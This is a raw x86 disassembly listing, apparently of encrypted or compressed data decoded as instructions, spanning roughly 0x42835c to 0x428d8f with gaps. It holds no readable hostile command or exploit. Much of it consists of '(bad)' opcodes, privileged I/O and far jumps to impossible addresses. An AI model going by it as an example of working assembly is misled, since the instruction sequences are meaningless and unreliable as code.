  42835c:	pop    ss
  42835d:	cwde   
  42835e:	mul    BYTE PTR [ecx]
  428360:	stos   DWORD PTR es:[edi],eax
  428361:	jo     0x428343
  428363:	fdivrp st(2),st
  428365:	aas    
  428366:	adc    BYTE PTR [ebp-0xd],dl
  428369:	pop    eax
  42836a:	out    0xc0,eax
  42836c:	jmp    0x76a98f52
  428371:	sub    DWORD PTR [ecx+ebx*2+0x3eeb9f97],eax
  428378:	dec    ecx
  428379:	jmp    0x75a5bcc
  42837e:	sub    BYTE PTR [edi+0x284fb437],bl
  428384:	pushf  
  428385:	div    BYTE PTR [edi]
  428387:	and    al,bh
  428389:	mov    al,0x3a
  42838b:	xor    BYTE PTR [ebp+0x12],ch
  42838e:	into   
  42838f:	adc    esi,DWORD PTR [ebx-0x5f]
  428392:	jae    0x4283f7
  428394:	retf   0x2b7e
  428397:	jnp    0x4283a9
  428399:	add    al,0x57
  42839b:	call   0xfc0e:0xcf87d377
  4283a2:	push   eax
  4283a3:	js     0x428362
  4283a5:	rcl    DWORD PTR [esi],cl
  4283a7:	(bad)  
  4283a8:	hlt    
  4283a9:	mov    BYTE PTR [edi],bh
  4283ab:	pop    ds
  4283ac:	adc    bh,dh
  4283ae:	es mov eax,0xa18bd1c3
  4283b4:	fmul   DWORD PTR [ebp+0x4a]
  4283b7:	ins    BYTE PTR es:[edi],dx
  4283b8:	hlt    
  4283b9:	mov    BYTE PTR [edi+0x14],dh
  4283bc:	dec    esi
  4283bd:	push   esi
  4283be:	addr16 aam 0x15
  4283c1:	into   
  4283c2:	mov    eax,ds:0xdd0f315a
  4283c7:	cld    
  4283c8:	(bad)  
  4283c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283ca:	rcl    BYTE PTR [esp+edx*4+0x6a],0xe5
  4283cf:	push   edi
  4283d0:	cmp    edi,DWORD PTR [ecx+0x113a408e]
  4283d6:	adc    eax,0x6055d371
  4283db:	ins    BYTE PTR es:[edi],dx
  4283dc:	pop    ecx
  4283dd:	imul   esp,DWORD PTR [ebp-0x4fdc23b3],0xffffffb8
  4283e4:	push   es
  4283e5:	arpl   WORD PTR [eax],bx
  4283e7:	shl    DWORD PTR [edi+0x39d9cc03],cl
  4283ed:	or     DWORD PTR [ebp-0x27],edx
  4283f0:	mov    ecx,0x27e96ead
  4283f5:	cmp    al,0x75
  4283f7:	push   ebp
  4283f8:	sbb    al,0x1
  4283fa:	je     0x42839d
  4283fc:	xor    DWORD PTR [edx+0x2ad857a1],esp
  428402:	xor    al,0xa4
  428404:	outs   dx,DWORD PTR ds:[esi]
  428405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428406:	push   0xfffffffe
  428408:	stos   BYTE PTR es:[edi],al
  428409:	bound  edi,QWORD PTR [ecx]
  42840b:	xchg   ebp,eax
  42840c:	mov    ds:0x6723e1,al
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x39abfb32
  428481:	mov    cl,0x6e
  428483:	daa    
  428484:	inc    eax
  428485:	scas   al,BYTE PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	into   
  42848d:	ror    edx,0x24
  428490:	jge    0x4284ad
  428492:	js     0x4284a6
  428494:	xor    DWORD PTR [ecx],ebx
  428496:	sub    BYTE PTR [edx-0x2d033be0],dl
  42849c:	pop    esp
  42849d:	add    BYTE PTR [ecx],0xa7
  4284a0:	addr16 int3 
  4284a2:	ins    DWORD PTR es:[edi],dx
  4284a3:	jg     0x4284d3
  4284a5:	xlat   BYTE PTR ds:[ebx]
  4284a6:	mov    dl,0x34
  4284a8:	sub    dl,BYTE PTR [ecx]
  4284aa:	(bad)  
  4284ab:	ds jbe 0x4284de
  4284ae:	(bad)  
  4284af:	in     eax,dx
  4284b0:	imul   BYTE PTR [ebx]
  4284b2:	dec    edx
  4284b3:	shr    DWORD PTR [edx],1
  4284b5:	xchg   edi,eax
  4284b6:	pushf  
  4284b7:	mov    dh,0xc6
  4284b9:	test   ah,dh
  4284bb:	(bad)  
  4284bd:	inc    esp
  4284be:	adc    DWORD PTR [ecx],0x11
  4284c1:	sbb    BYTE PTR [edi],0x5a
  4284c4:	aam    0x84
  4284c6:	ret    0xfac5
  4284c9:	xor    esi,DWORD PTR [ecx+edi*1-0x3bfa6cb7]
  4284d0:	push   edi
  4284d1:	test   DWORD PTR [ebx+0x2d269334],edx
  4284d7:	xor    al,0xc3
  4284d9:	push   ds
  4284da:	add    BYTE PTR [ebx],dh
  4284dc:	sbb    ch,BYTE PTR [edi+0x74731aed]
  4284e2:	xor    DWORD PTR [esi+0x70630dff],esi
  4284e8:	mov    ecx,0xffc43a41
  4284ed:	push   0xef25a6fc
  4284f2:	jl     0x4284c2
  4284f4:	push   ss
  4284f5:	enter  0xbcf2,0xad
  4284f9:	push   ebp
  4284fa:	hlt    
  4284fb:	test   al,0x7
  4284fd:	scas   al,BYTE PTR es:[edi]
  4284fe:	sbb    al,0xc5
  428500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428501:	mov    dl,0xd9
  428503:	jno    0x4284f4
  428505:	ror    BYTE PTR [ebx-0xd],0x14
  428509:	das    
  42850a:	inc    esp
  42850b:	je     0x4284ae
  42850d:	sbb    eax,0x345e4432
  428512:	pop    eax
  428513:	in     al,0xd2
  428515:	imul   eax,DWORD PTR [edi-0x6],0xb68be083
  42851c:	cmp    ecx,ebx
  42851e:	xor    ecx,esp
  428520:	and    al,bh
  428522:	nop
  428523:	repz pop ebx
  428525:	and    al,BYTE PTR [ecx+0x27]
  428528:	ss jg  0x42856f
  42852b:	inc    ebp
  42852c:	xor    BYTE PTR [ecx],bl
  42852e:	out    0x7c,eax
  428530:	add    bl,BYTE PTR [eax]
  428532:	retf   0xb882
  428535:	dec    esp
  428536:	and    edx,edx
  428538:	push   cs
  428539:	mov    al,ds:0xdae411d4
  42853e:	add    DWORD PTR [eax+0x7b7d7508],esp
  428544:	inc    esi
  428545:	fs jl  0x4285a6
  428548:	push   ss
  428549:	call   DWORD PTR [ecx-0x61]
  42854c:	add    ecx,DWORD PTR [eax+0x7c]
  42854f:	lds    eax,FWORD PTR [eax+0x46]
  428552:	push   esp
  428553:	hlt    
  428554:	or     DWORD PTR [edx],edi
  428556:	mov    dl,0x56
  428558:	or     DWORD PTR [ecx],ecx
  42855a:	xor    edx,DWORD PTR [edi+ecx*8]
  42855d:	(bad)  
  42855e:	jg     0x4285c1
  428560:	aam    0xe4
  428562:	jbe    0x42856f
  428564:	in     al,dx
  428565:	cmp    al,0xb3
  428567:	mov    bl,0x96
  428569:	fdivr  QWORD PTR [eax-0x566d9e20]
  42856f:	ins    BYTE PTR es:[edi],dx
  428570:	sub    BYTE PTR [edx-0x2b],0xd1
  428574:	jmp    0x1459:0xf1aaa7c5
  42857b:	mov    bl,BYTE PTR [eax]
  42857d:	sub    eax,DWORD PTR [esi]
  42857f:	sbb    eax,0x7577ed66
  428584:	inc    eax
  428585:	loope  0x428529
  428587:	inc    edx
  428588:	lock ja 0x47b9d30e
  42858f:	lods   al,BYTE PTR ds:[esi]
	...
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x6c68a3f6
  428602:	ret    
  428603:	fs inc esp
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	xlat   BYTE PTR ds:[bx]
  42860e:	ss mov ch,0x46
  428611:	push   0xb2ce0e4e
  428616:	adc    ebp,DWORD PTR [edi-0x1340e55a]
  42861c:	mov    bl,0x7b
  42861e:	xchg   ebp,eax
  42861f:	xchg   esi,eax
  428620:	push   ds
  428621:	repz jge 0x4285a8
  428624:	cmp    eax,0xadac622e
  428629:	(bad)  
  42862a:	push   ebx
  42862b:	mov    dh,0xab
  42862d:	mov    esp,0xbc925066
  428632:	inc    esp
  428633:	cli    
  428634:	sahf   
  428635:	inc    ebp
  428636:	add    dl,BYTE PTR [ecx+0xc89cb5f]
  42863c:	inc    ebx
  42863d:	adc    al,0xe9
  42863f:	sub    ebx,DWORD PTR [ebp+0x35]
  428642:	cmp    esi,ebp
  428644:	sbb    al,0x6b
  428646:	jbe    0x4286c1
  428648:	jle    0x428672
  42864a:	fnsave [eax-0x458c8e86]
  428650:	xchg   ecx,eax
  428651:	cdq    
  428652:	sub    DWORD PTR [eax],eax
  428654:	fsub   DWORD PTR [ecx]
  428656:	je     0x428688
  428658:	cwde   
  428659:	outs   dx,DWORD PTR ds:[esi]
  42865a:	sbb    eax,0xcba61353
  42865f:	push   esi
  428660:	pop    ebx
  428661:	jl     0x428642
  428663:	push   esp
  428664:	sub    bh,BYTE PTR [ecx-0x560551ff]
  42866a:	add    BYTE PTR [ebp-0xf74abfd],dl
  428670:	mov    ds:0x5526961b,eax
  428675:	sbb    al,0x88
  428677:	lahf   
  428678:	and    DWORD PTR [esi+esi*8+0x20],esi
  42867c:	dec    edx
  42867d:	push   ecx
  42867e:	int3   
  42867f:	adc    DWORD PTR [ebx],esp
  428681:	xchg   esi,eax
  428682:	pop    edi
  428683:	jbe    0x4286c2
  428685:	add    eax,0x3431bee8
  42868a:	lods   eax,DWORD PTR ds:[esi]
  42868b:	mov    bl,0xeb
  42868d:	stc    
  42868e:	nop
  42868f:	jl     0x428699
  428691:	cmp    al,0x68
  428693:	and    eax,0x80e55eef
  428698:	add    DWORD PTR [edx-0x73a19dfd],ecx
  42869e:	or     DWORD PTR cs:[ebx-0x24],esp
  4286a2:	or     ch,BYTE PTR ds:0xbd9ba406
  4286a8:	ret    
  4286a9:	push   ebx
  4286aa:	imul   eax,DWORD PTR [esi+edx*8],0x2430da72
  4286b1:	cmp    eax,edx
  4286b3:	sbb    eax,0xa4f7af04
  4286b8:	jle    0x42868e
  4286ba:	dec    esi
  4286bb:	jmp    WORD PTR [eax-0x3b0e1df5]
  4286c2:	jmp    0xafba1047
  4286c7:	xchg   cl,al
  4286c9:	and    BYTE PTR [edx-0x301e989f],bh
  4286cf:	cli    
  4286d0:	lds    eax,FWORD PTR [eax-0x63]
  4286d3:	adc    BYTE PTR [eax-0x2c],cl
  4286d6:	pop    ecx
  4286d7:	sbb    al,0xcf
  4286d9:	pop    ds
  4286da:	stos   DWORD PTR es:[edi],eax
  4286db:	retf   0xe4ac
  4286de:	pop    ecx
  4286df:	(bad)  
  4286e0:	and    al,0x35
  4286e2:	push   es
  4286e3:	shr    BYTE PTR [esi+0x69],1
  4286e6:	or     al,BYTE PTR [ebx]
  4286e8:	add    BYTE PTR [eax+0x5668cae6],al
  4286ee:	add    eax,0xfbf90e66
  4286f3:	or     edi,ebx
  4286f5:	int    0x9c
  4286f7:	and    eax,0x3cc48170
  4286fc:	push   es
  4286fd:	scas   eax,DWORD PTR es:[edi]
  4286fe:	xchg   ebx,eax
  4286ff:	out    dx,eax
  428700:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  428702:	cmp    DWORD PTR [ebp+0x1c141e58],esp
  428708:	jge    0x428716
  42870a:	(bad)
  42870e:	call   0x428714
	...
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x324e2496
  428783:	add    eax,0x1b048
  428788:	add    al,0x1
  42878a:	add    BYTE PTR [eax],al
  42878c:	je     0x4287f0
  42878e:	shr    BYTE PTR [ecx+0x51539a96],cl
  428794:	jge    0x428815
  428796:	sub    dl,dh
  428798:	dec    eax
  428799:	out    0xe1,al
  42879b:	and    eax,DWORD PTR [esi+0x693f2db8]
  4287a1:	mov    ah,0x1e
  4287a3:	popa   
  4287a4:	fnstcw WORD PTR [edi+0x2e]
  4287a7:	or     BYTE PTR [ecx-0x104e9c64],cl
  4287ad:	cmp    BYTE PTR [edi],al
  4287af:	aad    0xc1
  4287b1:	mov    ebx,0x5e5bffb
  4287b6:	enter  0x7ea4,0xc9
  4287ba:	pop    esp
  4287bb:	mov    bl,0xc7
  4287bd:	xor    ah,al
  4287bf:	data16 xlat BYTE PTR ds:[ebx]
  4287c1:	inc    esi
  4287c2:	mov    ah,0xf6
  4287c4:	adc    al,0x23
  4287c6:	iret   
  4287c7:	jg     0x4287c4
  4287c9:	cmp    bl,BYTE PTR [edi+eiz*2+0x6a948314]
  4287d0:	pop    ebx
  4287d1:	adc    al,BYTE PTR [esi]
  4287d3:	inc    eax
  4287d4:	scas   eax,DWORD PTR es:[edi]
  4287d5:	fisttp DWORD PTR [eax-0x74ba404b]
  4287db:	xor    DWORD PTR [edx-0x7d],0x26b9f99a
  4287e2:	(bad)  
  4287e3:	lods   eax,DWORD PTR ds:[esi]
  4287e4:	add    ebp,DWORD PTR [eax]
  4287e6:	xor    ebx,edi
  4287e8:	mov    dh,0xfa
  4287ea:	fisub  DWORD PTR [eax+eiz*1]
  4287ed:	fsub   QWORD PTR [ebp+0x35bdca86]
  4287f3:	sub    ch,dh
  4287f5:	cwde   
  4287f6:	ds add bh,al
  4287f9:	mov    dl,0x5a
  4287fb:	scas   eax,DWORD PTR es:[edi]
  4287fc:	lock pop edi
  4287fe:	scas   al,BYTE PTR es:[edi]
  4287ff:	jns    0x4287df
  428801:	nop
  428802:	or     DWORD PTR [esi+ebx*4],esp
  428805:	scas   eax,DWORD PTR es:[edi]
  428806:	data16 scas al,BYTE PTR es:[edi]
  428808:	push   0xdc8ef709
  42880d:	sbb    dl,BYTE PTR [ecx]
  42880f:	das    
  428810:	jp     0x4287fd
  428812:	pop    ebp
  428813:	or     bl,BYTE PTR [ecx+0x35]
  428816:	ret    0xea41
  428819:	push   cs
  42881a:	icebp  
  42881b:	shr    bh,cl
  42881d:	inc    DWORD PTR [esi]
  42881f:	mov    BYTE PTR [eax-0x3ba16df2],dh
  428825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428826:	mov    WORD PTR [edx-0x445914cb],ds
  42882c:	imul   eax,edi,0x7ce8e1ae
  428832:	popa   
  428833:	push   ss
  428834:	xchg   BYTE PTR [ecx],ch
  428836:	fwait
  428837:	xchg   edx,eax
  428838:	jge    0x428838
  42883a:	xor    ch,al
  42883c:	ror    DWORD PTR [edi+ebp*1+0x389de384],0x51
  428844:	ins    BYTE PTR es:[edi],dx
  428845:	sbb    DWORD PTR [edx-0x35302122],ebx
  42884b:	sub    ecx,DWORD PTR [edi]
  42884d:	(bad)  
  42884e:	fcom   QWORD PTR [eax-0x13]
  428851:	jmp    0x10a95edc
  428856:	inc    esi
  428857:	mov    cl,0x34
  428859:	jecxz  0x428889
  42885b:	adc    bl,ah
  42885d:	xchg   ebp,eax
  42885e:	sub    al,0x6b
  428860:	jmp    0xa4c1a997
  428865:	neg    BYTE PTR [edi-0x45]
  428868:	mov    bh,BYTE PTR [edi+eiz*8-0x47c7dc8d]
  42886f:	mov    ecx,0x833e6495
  428874:	add    DWORD PTR [edi],0xfffffff7
  428877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428878:	jp     0x4288f1
  42887a:	mov    esi,0xa98795a0
  42887f:	in     al,dx
  428880:	lock cmc 
  428882:	mov    ch,0x1a
  428884:	js     0x4288e3
  428886:	scas   eax,DWORD PTR es:[edi]
  428887:	push   cs
  428888:	adc    eax,0xf1ff3420
  42888d:	les    ecx,FWORD PTR [ecx+0x51]
	...
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x51049d0f],bx
  428902:	adc    eax,0x1b14c6e
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	pusha  
  42890d:	mov    ebx,0xc5885764
  428912:	mov    bl,0x7b
  428914:	(bad)  
  428915:	jg     0x428925
  428917:	jno    0x428921
  428919:	inc    ebp
  42891a:	sbb    BYTE PTR [ecx],ch
  42891c:	adc    al,0x6b
  42891e:	shl    DWORD PTR [bx-0x83b],cl
  428923:	std    
  428924:	js     0x42893c
  428926:	ds push es
  428928:	into   
  428929:	imul   ecx,DWORD PTR [edx+0x56],0xffffffb5
  42892d:	xlat   BYTE PTR ds:[ebx]
  42892e:	jg     0x428957
  428930:	push   edi
  428931:	inc    edi
  428932:	mov    ebp,0x2d3e1f41
  428937:	(bad)  
  428939:	ret    0xf310
  42893c:	es mov ebp,edi
  42893f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428940:	adc    DWORD PTR [ebx+ebp*4-0x2cfa6896],eax
  428947:	xor    DWORD PTR [edi],ecx
  428949:	and    edi,DWORD PTR [ebp-0x694d72db]
  42894f:	adc    ah,BYTE PTR [ebx]
  428951:	lods   eax,DWORD PTR ds:[esi]
  428952:	pop    es
  428953:	push   0xd0163b2e
  428958:	test   BYTE PTR [esi-0x30],dh
  42895b:	add    eax,0x9e97d0a1
  428960:	leave  
  428961:	add    al,0xcb
  428963:	jnp    0x4288fb
  428965:	add    esi,esi
  428967:	out    0xd,al
  428969:	call   0x7ab:0xe3ea2832
  428970:	popf   
  428971:	push   edi
  428972:	aaa    
  428973:	pop    eax
  428974:	xrelease xchg BYTE PTR [esi],cl
  428977:	sbb    edx,DWORD PTR [edx+edi*2]
  42897a:	nop
  42897b:	dec    ebp
  42897c:	mov    ch,BYTE PTR [edx]
  42897e:	popf   
  42897f:	sbb    BYTE PTR [esi],dl
  428981:	sub    DWORD PTR [eax+0x4],ebp
  428984:	add    BYTE PTR [esi],bh
  428986:	cli    
  428987:	adc    al,0xba
  428989:	aaa    
  42898a:	out    dx,eax
  42898b:	sub    BYTE PTR [ebx+0x41e81a61],ah
  428991:	int    0x77
  428993:	push   esp
  428994:	ss test al,0xe
  428997:	mov    cl,ah
  428999:	cdq    
  42899a:	pop    ss
  42899b:	cld    
  42899c:	fisttp QWORD PTR [esi]
  42899e:	sub    edx,ebx
  4289a0:	xchg   ebx,eax
  4289a1:	jnp    0x42899d
  4289a3:	ret    0x17af
  4289a6:	pushf  
  4289a7:	push   edx
  4289a8:	sbb    esp,esi
  4289aa:	(bad)  
  4289ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289ad:	adc    esp,DWORD PTR [edi+0x53833102]
  4289b3:	outs   dx,BYTE PTR ds:[esi]
  4289b4:	test   BYTE PTR [eax+0x3b5405d9],dl
  4289ba:	aaa    
  4289bb:	jns    0x428999
  4289bd:	jb     0x4289dd
  4289bf:	fnstsw WORD PTR [ecx]
  4289c1:	nop
  4289c2:	mov    al,ds:0xed19994
  4289c7:	push   ss
  4289c8:	cld    
  4289c9:	push   ss
  4289ca:	xchg   ebp,eax
  4289cb:	ins    BYTE PTR es:[edi],dx
  4289cc:	pop    es
  4289cd:	mov    edi,0xf2f069e2
  4289d2:	daa    
  4289d3:	in     eax,0xb9
  4289d5:	push   0x12
  4289d7:	pop    edi
  4289d8:	cmp    eax,DWORD PTR [esi+ebp*4]
  4289db:	xchg   ecx,eax
  4289dc:	mov    ebx,0x3832b6fe
  4289e1:	jp     0x428990
  4289e3:	sbb    ecx,DWORD PTR [ebx+0x6eae6d39]
  4289e9:	les    ebp,FWORD PTR [eax-0x21]
  4289ec:	test   eax,0x5f4341f7
  4289f1:	lds    esi,FWORD PTR [edx-0x4e1d3c80]
  4289f7:	cmp    ebx,DWORD PTR [edi+0x6f]
  4289fa:	pushf  
  4289fb:	jbe    0x428a02
  4289fd:	fadd   QWORD PTR [ecx+0x44c70728]
  428a03:	jnp    0x4289c6
  428a05:	aaa    
  428a06:	pop    ebx
  428a07:	sbb    esp,DWORD PTR [ebx]
  428a09:	xchg   edx,eax
  428a0a:	inc    ebp
  428a0b:	cdq    
  428a0c:	sbb    dh,BYTE PTR [ebx+0xac5e]
	...
  428a72:	add    BYTE PTR [eax],al
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x348bb413]
  428a83:	mov    DWORD PTR [eax-0x4e],edx
  428a86:	add    DWORD PTR [eax],eax
  428a88:	add    al,0x1
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	pop    ebx
  428a8d:	add    ebp,DWORD PTR [eax+0x46b74c7c]
  428a93:	adc    DWORD PTR [esi+esi*2],edi
  428a96:	out    dx,al
  428a97:	add    al,0x6d
  428a99:	xor    DWORD PTR [eax-0x3c],esi
  428a9c:	cmp    cl,BYTE PTR [ebx+0x6d9fc154]
  428aa2:	pop    edx
  428aa3:	arpl   bx,sp
  428aa5:	sub    ah,BYTE PTR [ebp+0x1b]
  428aa8:	aam    0xcb
  428aaa:	and    eax,0x2a4d3124
  428aaf:	dec    esp
  428ab0:	pop    ebx
  428ab1:	call   0x9ded:0x4e2e2d01
  428ab8:	inc    ebx
  428ab9:	shl    DWORD PTR [eax+0x703d1c7f],0x6
  428ac0:	neg    al
  428ac2:	pop    ds
  428ac3:	and    eax,0x77f75642
  428ac8:	and    BYTE PTR [eax],bl
  428aca:	sahf   
  428acb:	mov    edx,0x3cd3aa39
  428ad0:	pop    ecx
  428ad1:	inc    esi
  428ad2:	das    
  428ad3:	popf   
  428ad4:	hlt    
  428ad5:	cmp    DWORD PTR [eax-0x38ea210b],0xe86877b8
  428adf:	clc    
  428ae0:	int    0x1e
  428ae2:	cmp    DWORD PTR [edi+0xc],0xffffffc3
  428ae6:	or     al,0xcf
  428ae8:	xor    ch,BYTE PTR [ecx+ebx*8-0x5f660932]
  428aef:	push   0x72
  428af1:	jns    0x428b58
  428af3:	sahf   
  428af4:	cdq    
  428af5:	rcl    BYTE PTR [ecx],1
  428af7:	outs   dx,BYTE PTR ds:[esi]
  428af8:	adc    edi,DWORD PTR [ebx]
  428afa:	adc    BYTE PTR [ebx-0x7d817564],dh
  428b00:	mov    ecx,0x1b776726
  428b05:	xor    edx,DWORD PTR [edx-0x30]
  428b08:	xor    bl,dl
  428b0a:	int    0xef
  428b0c:	jge    0x428b1a
  428b0e:	nop
  428b0f:	sub    al,0x35
  428b11:	(bad)  
  428b12:	cmp    dh,BYTE PTR [ecx+0x3a]
  428b15:	scas   eax,DWORD PTR es:[edi]
  428b16:	in     eax,0x74
  428b18:	outs   dx,DWORD PTR ds:[esi]
  428b19:	adc    DWORD PTR [ebp+esi*2+0x13],esp
  428b1d:	in     eax,0x69
  428b1f:	push   cs
  428b20:	mov    bl,0xef
  428b22:	ins    BYTE PTR es:[edi],dx
  428b23:	fwait
  428b24:	pop    edi
  428b25:	out    0xe4,al
  428b27:	dec    ebx
  428b28:	loope  0x428b7c
  428b2a:	cmp    dh,dl
  428b2c:	(bad)  
  428b2d:	or     eax,0x87b0b359
  428b32:	dec    edi
  428b33:	loope  0x428b8b
  428b35:	xchg   esp,eax
  428b36:	bound  edx,QWORD PTR [ecx+ecx*2+0x15507e25]
  428b3d:	xchg   esi,eax
  428b3e:	push   0x593bf5f3
  428b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b44:	inc    edi
  428b45:	je     0x428b53
  428b47:	mov    esp,0xb21aeeba
  428b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b4d:	je     0x428b77
  428b4f:	inc    eax
  428b50:	jnp    0x428b15
  428b52:	adc    dl,BYTE PTR [ebp-0x486be87c]
  428b58:	js     0x428b48
  428b5a:	sub    DWORD PTR [edx],esp
  428b5c:	add    eax,ecx
  428b5e:	sub    ch,ch
  428b60:	lds    edi,FWORD PTR ds:0x33c554c0
  428b66:	es sbb al,0x33
  428b69:	push   esp
  428b6a:	xor    eax,0x2b699b26
  428b6f:	shl    DWORD PTR [ebx-0x10],1
  428b72:	cld    
  428b73:	adc    dh,BYTE PTR [esi-0x5e]
  428b76:	dec    ebx
  428b77:	retfw  0x737a
  428b7b:	js     0x428b66
  428b7d:	out    0xbf,al
  428b7f:	std    
  428b80:	jo     0x428ba6
  428b82:	fsubr  QWORD PTR [esi]
  428b84:	sub    eax,esi
  428b86:	xlat   BYTE PTR ds:[ebx]
  428b87:	retf   
  428b88:	inc    edi
  428b89:	into   
  428b8a:	jmp    0x232f4d5b
  428b8f:	fld    DWORD PTR [eax]
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x61223373
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	dec    ecx
  428c0d:	das    
  428c0e:	jp     0x428c61
  428c10:	ins    BYTE PTR es:[edi],dx
  428c11:	pop    ss
  428c12:	out    dx,al
  428c13:	in     al,dx
  428c14:	retf   0xfbd5
  428c17:	out    dx,al
  428c18:	push   ebp
  428c19:	xor    al,bl
  428c1b:	sbb    eax,0x7c9c2d78
  428c20:	mov    dh,ch
  428c22:	or     eax,DWORD PTR [esi+0x522955d3]
  428c28:	(bad)  
  428c29:	push   esp
  428c2a:	xchg   ebx,eax
  428c2b:	add    eax,0xbe7f8f84
  428c30:	xor    eax,0x8a9964a1
  428c35:	das    
  428c36:	fdivr  DWORD PTR [ecx+0x1f7a9b87]
  428c3c:	cmp    ebp,DWORD PTR [ebp-0x4d5ae361]
  428c42:	xor    bh,ch
  428c44:	int3   
  428c45:	std    
  428c46:	mov    ebp,0xeff5952
  428c4b:	in     eax,dx
  428c4c:	xchg   edi,eax
  428c4d:	sub    DWORD PTR [eax+0x46aa56de],esi
  428c53:	or     BYTE PTR [ecx+0x7d],0x88
  428c57:	mov    edx,0xf6d2626b
  428c5c:	or     al,0xd8
  428c5e:	dec    eax
  428c5f:	std    
  428c60:	rcl    DWORD PTR [edx],1
  428c62:	xchg   ebx,eax
  428c63:	leave  
  428c64:	sti    
  428c65:	fsub   QWORD PTR [ecx]
  428c67:	test   eax,0x65730eae
  428c6c:	or     cl,BYTE PTR [edi-0x56835dea]
  428c72:	stos   BYTE PTR es:[edi],al
  428c73:	das    
  428c74:	in     al,dx
  428c75:	hlt    
  428c76:	jb     0x428cdc
  428c78:	hlt    
  428c79:	and    al,0xa7
  428c7b:	aad    0x87
  428c7d:	lods   al,BYTE PTR ds:[esi]
  428c7e:	or     ecx,esp
  428c80:	add    bl,BYTE PTR [ecx+0x63]
  428c83:	fadd   DWORD PTR [esi]
  428c85:	or     edi,DWORD PTR [edi+eiz*2+0x72678f87]
  428c8c:	cmp    ebp,DWORD PTR [ecx]
  428c8e:	sbb    DWORD PTR [edx-0x2c],esi
  428c91:	pushf  
  428c92:	sub    eax,0x4d3b8852
  428c97:	fcom   st(5)
  428c99:	jmp    0x428c20
  428c9b:	clc    
  428c9c:	test   DWORD PTR [edx+edx*1],esi
  428c9f:	dec    ecx
  428ca0:	hlt    
  428ca1:	inc    eax
  428ca2:	cmp    ebp,DWORD PTR [edi+0x45]
  428ca5:	push   es
  428ca6:	loope  0x428ca8
  428ca8:	std    
  428ca9:	jno    0x428c5a
  428cab:	loope  0x428ccf
  428cad:	add    al,0x30
  428caf:	and    bl,dh
  428cb1:	pop    edi
  428cb2:	dec    edi
  428cb3:	cli    
  428cb4:	jmp    0x985877c1
  428cb9:	retf   
  428cba:	loope  0x428cb3
  428cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cbd:	push   edi
  428cbe:	inc    edi
  428cbf:	(bad)  
  428cc0:	daa    
  428cc1:	push   cs
  428cc2:	fdivr  DWORD PTR [ecx+ecx*1+0x6661dd5d]
  428cc9:	adc    ebx,DWORD PTR [esi-0x1fe81cae]
  428ccf:	adc    BYTE PTR [ebx],dh
  428cd1:	xlat   BYTE PTR ds:[ebx]
  428cd2:	int    0xc3
  428cd4:	sub    ah,BYTE PTR [eax+0xb391776]
  428cda:	nop
  428cdb:	sub    eax,0x7e1e7aa3
  428ce0:	ins    DWORD PTR es:[edi],dx
  428ce1:	repnz ss mov ah,0x3c
  428ce5:	push   es
  428ce6:	and    DWORD PTR [edi-0x4ef5ccd1],eax
  428cec:	std    
  428ced:	cmp    ecx,esp
  428cef:	inc    esp
  428cf0:	xor    ah,BYTE PTR [ecx+ebx*8]
  428cf3:	(bad)  
  428cf4:	mov    ds:0x137c512b,eax
  428cf9:	es push 0x7d
  428cfc:	mov    DWORD PTR [eax+0x7b],edi
  428cff:	out    0x74,al
  428d01:	or     ecx,edi
  428d03:	into   
  428d04:	repnz mul DWORD PTR [edi]
  428d07:	dec    ebx
  428d08:	sbb    esi,DWORD PTR [edx-0x43]
  428d0b:	inc    ebx
  428d0c:	cld    
  428d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d0e:	inc    eax
  428d0f:	inc    edx
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xd797
  428d82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d83:	adc    ebx,DWORD PTR [eax-0x4c]
  428d86:	add    DWORD PTR [eax],eax
  428d88:	add    al,0x1
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	pushf  
  428d8d:	xor    ecx,esi
  428d8f:	push   eax
